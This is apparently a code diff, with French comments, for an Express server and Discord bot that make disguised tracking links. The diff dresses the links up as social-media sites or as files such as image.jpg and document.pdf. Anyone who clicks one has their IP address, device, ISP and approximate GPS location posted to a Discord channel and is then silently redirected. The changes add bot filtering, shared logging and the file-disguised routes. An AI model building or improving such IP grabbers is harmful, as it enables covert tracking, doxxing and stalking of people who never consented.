@@ -60,9 +60,8 @@ async function shortenWithCuttly(longUrl, suffix) {
   }
 }
 
-// Serveur Express
-app.get('/:type', async (req, res) => {
-  const { type } = req.params;
+// Fonction commune pour envoyer un embed IP
+async function logIp(req, res, redirectUrl = null) {
   const u = req.query.u;
   if (!u) return res.redirect('https://google.com');
 
@@ -90,8 +89,10 @@ app.get('/:type', async (req, res) => {
     ? `[${bestCoords}](https://maps.google.com/?q=${bestCoords})`
     : '❌ Introuvable';
 
+  const isBot = !userAgent || /bot|crawler|discord|cloudflare/i.test(userAgent);
+
   const embed = new EmbedBuilder()
-    .setTitle('📥 Nouvelle connexion détectée')
+    .setTitle(isBot ? '⚙️ Scan automatique détecté' : '📥 Nouvelle connexion détectée')
     .addFields(
       { name: 'IP', value: `\`${ip}\`` },
       { name: 'Appareil', value: `${device.client?.name || 'Inconnu'} - ${device.os?.name || 'Inconnu'}` },
@@ -102,7 +103,7 @@ app.get('/:type', async (req, res) => {
       { name: 'FAI', value: geo?.traits?.isp || '❌ Introuvable', inline: true },
       { name: 'Localisation GPS', value: coordsField }
     )
-    .setColor(0x00AE86)
+    .setColor(isBot ? 0x808080 : 0x00AE86)
     .setTimestamp();
 
   try {
@@ -124,12 +125,23 @@ app.get('/:type', async (req, res) => {
     console.error("Erreur Discord:", err.message);
   }
 
-  if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(type)) {
-    let url = `https://${type === 'x' ? 'x' : type}.com`;
-    return res.redirect(url);
+  if (redirectUrl) {
+    return res.redirect(redirectUrl);
+  } else {
+    return res.status(204).send();
   }
+}
 
-  res.status(204).send();
+// Routes Express
+app.get('/:type', async (req, res) => {
+  const { type } = req.params;
+
+  if (['image.jpg', 'video.mp4', 'document.pdf'].includes(type)) {
+    await logIp(req, res);
+  } else {
+    const redirectUrl = type === 'x' ? 'https://x.com' : `https://${type}.com`;
+    await logIp(req, res, redirectUrl);
+  }
 });
 
 app.listen(port, () => {
@@ -201,7 +213,8 @@ client.on(Events.InteractionCreate, async interaction => {
     clients[uniqueId] = privateChannel.id;
     fs.writeFileSync(CLIENTS_FILE, JSON.stringify(clients, null, 2));
   }
-
+});
+client.on(Events.InteractionCreate, async interaction => {
   if (interaction.isStringSelectMenu() && interaction.customId === 'select_tracker_type') {
     if (interaction.replied || interaction.deferred) return;
     await interaction.reply({ content: "🔗 Génération de ton lien...", ephemeral: true });
@@ -215,7 +228,7 @@ client.on(Events.InteractionCreate, async interaction => {
 
     let generatedUrl;
     if (['instagram', 'youtube', 'tiktok', 'facebook', 'x', 'discord'].includes(selection)) {
-      generatedUrl = `https://${selection === 'x' ? 'x' : selection}.com`;
+      generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
     } else {
       generatedUrl = `${baseUrl}/${selection}?u=${uniqueId}`;
     }
